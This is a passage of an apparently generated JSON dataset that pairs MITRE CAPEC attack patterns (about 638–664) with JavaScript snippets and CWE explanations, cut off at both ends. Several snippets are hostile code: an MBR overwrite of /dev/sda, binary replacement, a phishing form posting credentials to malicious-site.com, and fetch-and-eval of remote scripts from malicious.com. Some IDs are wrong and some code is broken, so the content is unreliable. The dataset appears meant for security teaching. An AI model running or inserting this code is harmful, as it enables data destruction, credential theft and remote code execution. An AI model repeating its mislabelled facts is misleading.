        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nfunction modifyMBR() {\n  try {\n    // Read the MBR (Master Boot Record)\n    let mbr = fs.readFileSync('/dev/sda', { encoding: 'binary', length: 512 });\n    \n    // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n    // CWE-1326: Missing Immutable Root of Trust in Hardware\n    // Inject malicious code into the MBR\n    let maliciousCode = '...'; // Placeholder for malicious payload\n    mbr = mbr.slice(0, 446) + maliciousCode + mbr.slice(446 + maliciousCode.length);\n    \n    // Write the modified MBR back to the disk\n    fs.writeFileSync('/dev/sda', mbr, { encoding: 'binary' });\n    \n    // CWE-1220: Insufficient Granularity of Access Control\n    // Execute the malicious payload\n    exec('malicious_payload', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Error executing payload: ${error}`);\n        return;\n      }\n      console.log(`Payload executed: ${stdout}`);\n    });\n  } catch (err) {\n    console.error(`Failed to modify MBR: ${err}`);\n  }\n}\n\n// CWE-1277: Firmware Not Updateable\n// Simulate the attack by calling the function\nmodifyMBR();",
        "description": "This JavaScript code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include and execute malicious code. The function `modifyMBR` reads the MBR, injects a placeholder for malicious code, and writes the modified MBR back to the disk. It then executes the malicious payload. The code embodies the main idea of the CAPEC by showing how an adversary could exploit improperly protected firmware and insufficient access controls to achieve persistence on a system. The related CWEs provide context for the vulnerabilities being exploited, such as improper access control for volatile memory, missing immutable root of trust, and insufficient granularity of access control."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\nconst path = '/tmp/sensitive_info.txt';\n\n// Writing sensitive information to a file with improper permissions\nfs.writeFileSync(path, 'Sensitive Information', { mode: 0o666 });\n\n// Reading the file without proper access control\nfs.readFile(path, 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log(data);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is written to a file with improper permissions, making it accessible to unauthorized users. The file is created in the '/tmp' directory with permissions set to 0o666, which allows read and write access to all users. This embodies the CAPEC 'Probe System Files' by showing how sensitive information can be exposed due to improperly protected files. The related CWEs are represented by the insecure temporary file creation (CWE-377), files accessible to external parties (CWE-552), and exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "const fs = require('fs');\nconst vm = require('vm');\n\n// CWE-829: Including functionality from an untrusted source\nconst untrustedCode = fs.readFileSync('untrustedLibrary.js', 'utf8');\n\n// CWE-913: Improper control of dynamically-managed code resources\nconst sandbox = { process: process, require: require, console: console };\n\n// CWE-114: Process control vulnerability\ntry {\n  vm.createContext(sandbox);\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n\n// CWE-506: Embedded malicious code\n// The untrustedLibrary.js could contain malicious code that gets executed\n// CWE-1265: Unintended reentrant invocation\n// If the untrusted code calls non-reentrant code, it could cause nested invocations",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application includes and executes code from an untrusted source. The code reads a potentially malicious script ('untrustedLibrary.js') and executes it within a sandboxed environment using Node.js's 'vm' module. This represents the CAPEC's main idea of an adversary injecting and executing arbitrary code within an existing process. The code also highlights several related CWEs: CWE-829 (including functionality from an untrusted source), CWE-913 (improper control of dynamically-managed code resources), CWE-114 (process control vulnerability), CWE-506 (embedded malicious code), and CWE-1265 (unintended reentrant invocation). The untrusted script could exploit these weaknesses to execute malicious actions, access sensitive resources, or escalate privileges."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "const { exec } = require('child_process');\nconst path = require('path');\n\n// Vulnerable function that loads a DLL from an untrusted path\nfunction loadDLL(dllName) {\n  const dllPath = path.join(__dirname, dllName);\n  exec(`rundll32 ${dllPath},DllMain`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error loading DLL: ${error.message}`);\n      return;\n    }\n    console.log(`DLL loaded successfully: ${stdout}`);\n  });\n}\n\n// Example usage\nloadDLL('malicious.dll');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that loads a DLL from an untrusted path, embodying the main idea of the CAPEC 'DLL Side-Loading'. The function 'loadDLL' constructs a path to the DLL using the current directory and the provided DLL name, then uses the 'exec' function to run the 'rundll32' command to load the DLL. This approach is vulnerable to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path) because it does not verify the integrity or trustworthiness of the DLL being loaded. An attacker could place a malicious DLL in the same directory, leading to the execution of malicious code."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst binaryPath = '/usr/local/bin/someBinary';\nconst maliciousBinary = '/tmp/maliciousBinary';\n\n// Check if the binary exists and has weak permissions\nfs.stat(binaryPath, (err, stats) => {\n  if (err) throw err;\n  if ((stats.mode & 0o777) !== 0o755) { // Weak permissions check\n    // Replace the binary with a malicious one\n    fs.copyFile(maliciousBinary, binaryPath, (err) => {\n      if (err) throw err;\n      console.log('Binary replaced with malicious code');\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a potential 'Replace Binaries' attack. It checks if a binary located at '/usr/local/bin/someBinary' has weak file permissions (not set to 755). If the permissions are weak, it replaces the binary with a malicious one located at '/tmp/maliciousBinary'. This embodies the CAPEC concept of replacing binaries with malware due to improper permission settings (CWE-732). The code also touches on CWE-426 by assuming the binary path is trusted and CWE-506 by introducing malicious code. The snippet highlights the risk of weak file permissions and the potential for an attacker to replace critical binaries with malicious ones."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Directory to search for shared files\nconst sharedDir = path.join('\\\\UNC\\share\\name\\');\n\n// Function to list files in the shared directory\nfunction listSharedFiles(directory) {\n  try {\n    const files = fs.readdirSync(directory);\n    files.forEach(file => {\n      const filePath = path.join(directory, file);\n      const stats = fs.statSync(filePath);\n      if (stats.isFile()) {\n        console.log(`Found file: ${filePath}`);\n      } else if (stats.isDirectory()) {\n        listSharedFiles(filePath); // Recursively list files in subdirectories\n      }\n    });\n  } catch (err) {\n    console.error(`Error accessing ${directory}:`, err.message);\n  }\n}\n\n// Start listing files from the shared directory\nlistSharedFiles(sharedDir);",
        "description": "This JavaScript code snippet demonstrates how an adversary might identify shared files and directories on a system by recursively searching a specified UNC path (\\\\UNC\\share\\name\\). The code uses Node.js's 'fs' and 'path' modules to read the contents of the shared directory and log the paths of any files found. This embodies the CAPEC's main idea of discovering connections between systems through shared resources. The code also touches on related CWEs: it assumes the existence of shared directories (CWE-552), potentially exposes sensitive information (CWE-200), and uses a fixed search path that could be manipulated (CWE-427)."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "const crypto = require('crypto');\nconst net = require('net');\n\n// Simulate storing password hash\nconst storedHash = crypto.createHash('md5').update('password123').digest('hex');\n\n// Simulate client sending hash instead of password\nconst clientHash = crypto.createHash('md5').update('password123').digest('hex');\n\n// Server-side authentication check\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const receivedHash = data.toString();\n    if (receivedHash === storedHash) {\n      socket.write('Authentication successful');\n    } else {\n      socket.write('Authentication failed');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Client-side code to send hash\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write(clientHash);\n});\n\nclient.on('data', (data) => {\n  console.log('Server response: ' + data.toString());\n  client.destroy();\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Use of Captured Hashes (Pass The Hash)' attack. The server stores a password hash and authenticates clients by comparing the received hash with the stored hash. The client sends the hash of the password instead of the password itself. This approach is vulnerable to attacks where an adversary can capture the hash and reuse it to gain unauthorized access, as described in CWE-836 (Use of Password Hash Instead of Password for Authentication) and CWE-294 (Authentication Bypass by Capture-replay). The code also highlights the risk of using single-factor authentication (CWE-308) and insufficiently protected credentials (CWE-522)."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "const net = require('net');\n\n// Simulate a captured Kerberos ticket\nconst capturedTicket = 'captured_ticket_data';\n\n// Create a client to replay the captured ticket\nconst client = new net.Socket();\nclient.connect(88, 'target_kerberos_server', () => {\n  console.log('Connected to Kerberos server');\n  // Send the captured ticket to the server\n  client.write(capturedTicket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection after receiving the response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a 'Pass The Ticket' attack. It uses the 'net' module to create a TCP client that connects to a Kerberos server on port 88. The client sends a captured Kerberos ticket to the server, simulating an authentication attempt using stolen credentials. This embodies the main idea of CAPEC-639, where an adversary uses stolen Kerberos tickets to access systems. The code also touches on related CWEs: CWE-522 (Insufficiently Protected Credentials) by using a captured ticket, CWE-294 (Authentication Bypass by Capture-replay) by replaying the ticket, and CWE-308 (Use of Single-factor Authentication) by not requiring additional authentication factors."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to check for USB device connections by reading Windows registry\nfunction checkUSBDevices() {\n  const registryPath = 'C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM';\n  try {\n    const data = fs.readFileSync(registryPath, 'utf8');\n    if (data.includes('USBSTOR')) {\n      console.log('USB device detected');\n    } else {\n      console.log('No USB device detected');\n    }\n  } catch (err) {\n    console.error('Error reading registry:', err);\n  }\n}\n\n// Function to search for iOS backups\nfunction searchIOSBackups() {\n  const backupPath = path.join(process.env.HOME || process.env.USERPROFILE, 'AppData', 'Roaming', 'Apple Computer', 'MobileSync', 'Backup');\n  try {\n    if (fs.existsSync(backupPath)) {\n      console.log('iOS backup found');\n    } else {\n      console.log('No iOS backup found');\n    }\n  } catch (err) {\n    console.error('Error searching for iOS backups:', err);\n  }\n}\n\n// Execute functions\ncheckUSBDevices();\nsearchIOSBackups();",
        "description": "This JavaScript code snippet demonstrates how an adversary might attempt to obtain information about attached peripheral devices and components connected to a computer system, embodying the main idea of the CAPEC 'Peripheral Footprinting'. The 'checkUSBDevices' function reads the Windows registry to detect connected USB devices, which relates to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The 'searchIOSBackups' function searches for iOS backups in the user's directory, which can expose sensitive information (CWE-200). Both functions illustrate how an attacker could gather information about the system's peripherals to gain additional insight for further attacks."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "const registry = require('winreg');\n\nfunction readRegistryKey(keyPath) {\n  const regKey = new registry({\n    hive: registry.HKLM, // Accessing HKEY_LOCAL_MACHINE\n    key: keyPath\n  });\n\n  regKey.values((err, items) => {\n    if (err) {\n      console.error('Error reading registry:', err);\n    } else {\n      items.forEach((item) => {\n        console.log(`${item.name}: ${item.value}`); // Potentially sensitive information in cleartext\n      });\n    }\n  });\n}\n\n// Example usage\nreadRegistryKey('SOFTWARE\\ExampleSoftware');",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to gather sensitive system-specific data. The code uses the 'winreg' module to access and read values from a specified registry key path (HKEY_LOCAL_MACHINE\\SOFTWARE\\ExampleSoftware). The retrieved values, which may include sensitive information, are then printed to the console. This example highlights vulnerabilities such as improper authorization (CWE-285), cleartext storage in the registry (CWE-314), and exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "const captureScreen = () => {\n  try {\n    // Check if the user has the necessary privilege\n    if (user.hasPrivilege('SCREEN_CAPTURE')) {\n      // Capture the screen\n      html2canvas(document.body).then(canvas => {\n        // Convert the canvas to an image\n        const imgData = canvas.toDataURL('image/png');\n        // Send the image data to the server in cleartext\n        fetch('http://example.com/upload', {\n          method: 'POST',\n          headers: {\n            'Content-Type': 'application/json'\n          },\n          body: JSON.stringify({ image: imgData })\n        }).then(response => {\n          if (!response.ok) {\n            throw new Error('Network response was not ok');\n          }\n          return response.json();\n        }).then(data => {\n          console.log('Success:', data);\n        }).catch(error => {\n          console.error('Error:', error);\n        });\n      });\n    } else {\n      console.error('User does not have the required privilege');\n    }\n  } catch (error) {\n    console.error('An error occurred:', error);\n  }\n};\n\n// Simulate a user with the SCREEN_CAPTURE privilege\nconst user = {\n  hasPrivilege: (privilege) => privilege === 'SCREEN_CAPTURE'\n};\n\n// Trigger the screen capture\ncaptureScreen();",
        "description": "This JavaScript code snippet demonstrates a screen capture functionality that can be exploited to gather sensitive information. The function `captureScreen` checks if the user has the 'SCREEN_CAPTURE' privilege (CWE-267). If the privilege is granted, it uses the `html2canvas` library to capture the screen and convert it to an image. The image data is then sent to a server in cleartext (CWE-319), which can be intercepted by unauthorized actors. This code embodies the CAPEC's main idea of collecting data from screen capture and highlights the associated weaknesses, such as unsafe privilege actions and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath) {\n  // Check if the file extension has a trailing space\n  if (filePath.endsWith(' ')) {\n    console.log('Invalid file extension with trailing space detected.');\n    return;\n  }\n\n  // Extract the file extension\n  const fileExtension = path.extname(filePath);\n\n  // Only allow .txt files\n  if (fileExtension !== '.txt') {\n    console.log('Invalid file type. Only .txt files are allowed.');\n    return;\n  }\n\n  // Read the file content\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nuploadFile('example.txt '); // This should trigger the invalid file extension check\nuploadFile('example.txt'); // This should proceed to read the file content",
        "description": "This JavaScript code snippet demonstrates a simple file upload function that checks for a trailing space in the file extension, which is a common vulnerability described in CAPEC-Adding a Space to a File Extension. The function `uploadFile` first checks if the provided file path ends with a space and rejects it if true. It then checks if the file extension is `.txt` and proceeds to read the file content if valid. This snippet highlights the importance of validating file extensions properly to prevent potential security issues related to ambiguous path resolution and file misclassification."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\nconst path = require('path');\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Unrestricted upload of file with dangerous type (CWE-434)\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads. The server listens for POST requests at the '/upload' endpoint. When a file is uploaded, it is saved to the 'uploads' directory without any validation or restriction on the file type (CWE-434). This represents the main idea of the CAPEC 'Upload a Web Shell to a Web Server', as it demonstrates how an attacker could exploit insufficient permissions and lack of proper file validation to upload a malicious web shell. The code also indirectly touches on other related CWEs, such as improper authentication (CWE-287) and client-side enforcement of server-side security (CWE-602), by not implementing any authentication or security checks."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/record') {\n    const audioStream = fs.createWriteStream('recorded_audio.wav');\n    req.pipe(audioStream);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Recording started');\n  } else if (req.url === '/playback') {\n    fs.readFile('recorded_audio.wav', (err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Error reading file');\n      } else {\n        res.writeHead(200, {'Content-Type': 'audio/wav'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that can record audio data sent to the '/record' endpoint and save it to a file named 'recorded_audio.wav'. The '/playback' endpoint allows the recorded audio to be played back. This code embodies the concept of eavesdropping (CAPEC-200) by capturing audio data without proper authorization or encryption, exposing sensitive information (CWE-200, CWE-319). The recorded audio is stored in a file, which can be considered a covert storage channel (CWE-515). The server does not implement any security measures to protect the audio data, making it vulnerable to unauthorized access and eavesdropping."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "const kerberos = require('kerberos');\nconst fs = require('fs');\n\n// Load credentials from a file (CWE-522)\nconst credentials = JSON.parse(fs.readFileSync('credentials.json', 'utf8'));\n\n// Function to authenticate using Kerberos\nfunction authenticate(user, password) {\n  kerberos.initializeClient(`HTTP@${user}`, { user, password }, (err, client) => {\n    if (err) {\n      console.error('Authentication failed:', err);\n      return;\n    }\n    console.log('Authenticated successfully');\n  });\n}\n\n// Simulate an attacker using stolen credentials (CAPEC-117)\nconst stolenCredentials = credentials.stolen;\nauthenticate(stolenCredentials.user, stolenCredentials.password);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker uses stolen Kerberos credentials to authenticate and gain access to a system. The credentials are insecurely stored in a file (CWE-522), which the attacker can easily access. The `authenticate` function uses the Kerberos library to initialize a client with the provided user and password. The code simulates an attack by reading stolen credentials from a file and attempting to authenticate with them. This embodies the main idea of CAPEC-117, where an adversary uses known Kerberos credentials to gain unauthorized access."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst users = { 'admin': 'password123' }; // CWE-522: Insufficiently Protected Credentials\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    // CWE-308: Use of Single-factor Authentication\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic Express server with a login endpoint. It uses a hardcoded username and password for authentication, which is an example of CWE-522 (Insufficiently Protected Credentials). The authentication mechanism relies on single-factor authentication (CWE-308), where only a username and password are required. This setup is vulnerable to the CAPEC described, as an adversary could guess or obtain the credentials to gain unauthorized access. The code does not implement measures to prevent multiple failed authentication attempts (CWE-307), nor does it use multi-factor authentication (CWE-654)."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a fake login form\n  var fakeForm = document.createElement('form');\n  fakeForm.setAttribute('action', 'https://malicious-site.com/steal-credentials');\n  fakeForm.setAttribute('method', 'POST');\n\n  var usernameField = document.createElement('input');\n  usernameField.setAttribute('type', 'text');\n  usernameField.setAttribute('name', 'username');\n  usernameField.setAttribute('placeholder', 'Username');\n  fakeForm.appendChild(usernameField);\n\n  var passwordField = document.createElement('input');\n  passwordField.setAttribute('type', 'password');\n  passwordField.setAttribute('name', 'password');\n  passwordField.setAttribute('placeholder', 'Password');\n  fakeForm.appendChild(passwordField);\n\n  var submitButton = document.createElement('button');\n  submitButton.setAttribute('type', 'submit');\n  submitButton.textContent = 'Login';\n  fakeForm.appendChild(submitButton);\n\n  // Append the fake form to the body\n  document.body.appendChild(fakeForm);\n});",
        "description": "This JavaScript code snippet demonstrates a Credential Prompt Impersonation attack. When the DOM content is loaded, it creates a fake login form that mimics a legitimate credential prompt. The form is set to send the entered credentials to a malicious site ('https://malicious-site.com/steal-credentials'). This example embodies CWE-1021 by improperly rendering a UI layer that can confuse users into thinking they are interacting with a legitimate interface. It also touches on CWE-522 and CWE-798 by potentially transmitting credentials insecurely and CWE-1391 by potentially using weak or default credentials."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Function to add data to a file to avoid security tool detection\nfunction addDataToFile(filePath, data) {\n  try {\n    // Read the original file content\n    let fileContent = fs.readFileSync(filePath, 'utf8');\n    \n    // Add additional data to the file\n    fileContent += data;\n    \n    // Write the modified content back to the file\n    fs.writeFileSync(filePath, fileContent, 'utf8');\n    \n    // Log the new hash of the file\n    const hash = crypto.createHash('sha256').update(fileContent).digest('hex');\n    console.log(`New file hash: ${hash}`);\n  } catch (err) {\n    console.error('Error modifying file:', err);\n  }\n}\n\n// Example usage\naddDataToFile('example.txt', 'Additional data to increase file size and change hash.');",
        "description": "This JavaScript code snippet demonstrates how an adversary might add data to a file to increase its size and change its hash, thereby avoiding detection by security tools. The `addDataToFile` function reads the content of a specified file, appends additional data to it, and writes the modified content back to the file. It then logs the new hash of the file, which would be different from the original hash, frustrating security tools that rely on hash-based detection. This snippet embodies the main idea of the CAPEC by showing how an attacker can manipulate a file to evade security measures. The related CWEs provide context on potential vulnerabilities, such as the inclusion of sensitive information in files, reliance on file names or extensions, and the handling of dangerous file types."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const phoneNumber = queryObject.phone;\n  const sensitiveInfo = queryObject.info;\n\n  if (!phoneNumber || !sensitiveInfo) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request');\n    return;\n  }\n\n  // Simulate a voice phishing attack\n  console.log(`Calling ${phoneNumber} to solicit sensitive information...`);\n  console.log(`Sensitive Information: ${sensitiveInfo}`);\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Information received');\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server that simulates a voice phishing attack. The server listens for incoming requests containing a phone number and sensitive information as query parameters. It then logs these details, mimicking the process of an adversary calling a victim to solicit sensitive information. This code embodies the main idea of CAPEC-940 (Voice Phishing) by demonstrating how an attacker might collect sensitive information via a voice call. The code also highlights related CWEs such as CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the request, CWE-522 (Insufficiently Protected Credentials) by transmitting sensitive information insecurely, and CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) by exposing sensitive information to unauthorized entities."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "const updateUrl = 'https://malicious-site.com/update';\n\nfunction checkForUpdates() {\n  fetch(updateUrl)\n    .then(response => response.text())\n    .then(data => {\n      if (data.includes('new update available')) {\n        downloadAndUpdate(data);\n      }\n    })\n    .catch(error => console.error('Error fetching update:', error));\n}\n\nfunction downloadAndUpdate(updateData) {\n  const script = document.createElement('script');\n  script.src = updateData;\n  document.body.appendChild(script);\n}\n\n// Simulate an automatic update check\ncheckForUpdates();",
        "description": "This JavaScript code snippet demonstrates a malicious automated software update via spoofing. The `checkForUpdates` function fetches update information from a malicious URL (`https://malicious-site.com/update`). If the response contains a specific string indicating a new update, it calls the `downloadAndUpdate` function, which dynamically creates a script element and sets its source to the malicious update data. This script is then appended to the document body, executing the malicious code. This example embodies the CAPEC by showing how an attacker can trick a client into downloading and executing malicious updates. The code also reflects related CWEs, such as downloading code without integrity checks (CWE-494) and embedding malicious code (CWE-506)."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    eval(data); // Dangerous: executing downloaded code without integrity check\n  });\n});\n\n// Function to check if the device is rooted/jailbroken\nfunction isRooted() {\n  try {\n    fs.accessSync('/system/app/Superuser.apk');\n    return true;\n  } catch (e) {\n    return false;\n  }\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nif (isRooted()) {\n  console.log('Device is rooted');\n} else {\n  console.log('Device is not rooted');\n}\n\n// CWE-939: Improper Authorization in Handler for Custom URL Scheme\nfunction handleCustomURL(url) {\n  if (url.startsWith('myapp://')) {\n    console.log('Handling custom URL:', url);\n    // CWE-78: OS Command Injection\n    const exec = require('child_process').exec;\n    exec(url.slice(8), (error, stdout, stderr) => {\n      if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.log(`stderr: ${stderr}`);\n    });\n  }\n}\n\n// Simulate handling a custom URL\nhandleCustomURL('myapp://ls');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Root/Jailbreak Detection Evasion via Hooking' and associated CWEs. The code downloads and executes code from an untrusted source without integrity checks (CWE-494, CWE-829), checks if the device is rooted (potentially exposing sensitive information, CWE-497), and handles a custom URL scheme without proper authorization (CWE-939), leading to potential OS command injection (CWE-78). This represents how an adversary might evade root/jailbreak detection and execute arbitrary code by exploiting these weaknesses."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "function checkRoot() {\n  // Debugging code left active\n  if (typeof window.__DEBUG__ !== 'undefined' && window.__DEBUG__) {\n    console.log('Debug mode is active');\n    // Exposing sensitive system information\n    console.log('Sensitive Info: ', navigator.userAgent);\n  }\n\n  // Root/Jailbreak detection logic\n  try {\n    if (window.navigator.userAgent.includes('root') || window.navigator.userAgent.includes('jailbreak')) {\n      throw new Error('Root/Jailbreak detected');\n    }\n  } catch (e) {\n    console.error(e.message);\n    // Improper management of sensitive trace data\n    console.trace();\n  }\n}\n\n// Simulate application entry point\ncheckRoot();",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can evade Root/Jailbreak detection by leveraging active debugging code. The `checkRoot` function contains a debug check that logs sensitive system information if debugging is active. The Root/Jailbreak detection logic checks the user agent for indicators of rooting or jailbreaking and throws an error if detected. The error handling includes a call to `console.trace()`, which can expose sensitive trace data. This snippet embodies the CAPEC's main idea by showing how active debug code and improper management of sensitive information can be exploited to bypass security mechanisms."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "const downloadAndExecute = (url) => {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n};\n\nconst manipulateTraffic = () => {\n  const originalFetch = window.fetch;\n  window.fetch = function() {\n    return originalFetch.apply(this, arguments).then(response => {\n      if (response.url.includes('sensitive-endpoint')) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        console.log('Intercepted response:', response);\n      }\n      return response;\n    });\n  };\n};\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\nif (userIsAuthenticated) {\n  manipulateTraffic();\n}\n\n// CWE-368: Context Switching Race Condition\nlet isSwitching = false;\nconst switchContext = () => {\n  if (isSwitching) return;\n  isSwitching = true;\n  setTimeout(() => {\n    // Simulate context switch\n    isSwitching = false;\n  }, 100);\n};\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = () => {\n  console.log('Executing malicious code');\n};\n\n// Example usage\nswitchContext();\ndownloadAndExecute('http://example.com/malicious.js');\nmaliciousCode();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Adversary in the Browser (AiTB)'. The 'downloadAndExecute' function fetches and executes code from a remote URL without verifying its integrity (CWE-494). The 'manipulateTraffic' function intercepts and logs responses from sensitive endpoints, representing a channel accessible by a non-endpoint (CWE-300). The code also includes a client-side check for user authentication before manipulating traffic, which is a flawed security mechanism (CWE-602). A simulated context switch with a race condition is shown in 'switchContext' (CWE-368). Finally, 'maliciousCode' represents embedded malicious code (CWE-506). This snippet embodies the main idea of AiTB by demonstrating how an adversary can exploit browser vulnerabilities to manipulate traffic and execute malicious actions."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function vulnerableFunction(secret) {\n  let publicData = 0;\n  let speculativeData = new Array(256).fill(0);\n  let index = secret & 0xFF; // Simulate speculative execution vulnerability\n\n  // Speculative execution: access array out of bounds\n  if (index < speculativeData.length) {\n    publicData = speculativeData[index];\n  }\n\n  // Covert channel: use cache timing to infer secret\n  let start = performance.now();\n  let temp = speculativeData[0]; // Access to create cache timing difference\n  let end = performance.now();\n\n  console.log('Timing difference:', end - start);\n}\n\n// Example usage\nvulnerableFunction(0x12345678);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a transient execution attack, specifically speculative execution, which can lead to the exposure of sensitive information. The function `vulnerableFunction` takes a secret value and uses it to index into an array, simulating speculative execution by accessing an out-of-bounds index. This access can cause microarchitectural changes that are not immediately discarded. The timing difference in accessing the array is then measured, which can be used as a covert channel to infer the secret value. This example embodies the main idea of CAPEC-Exploitation of Transient Instruction Execution and incorporates related CWEs such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
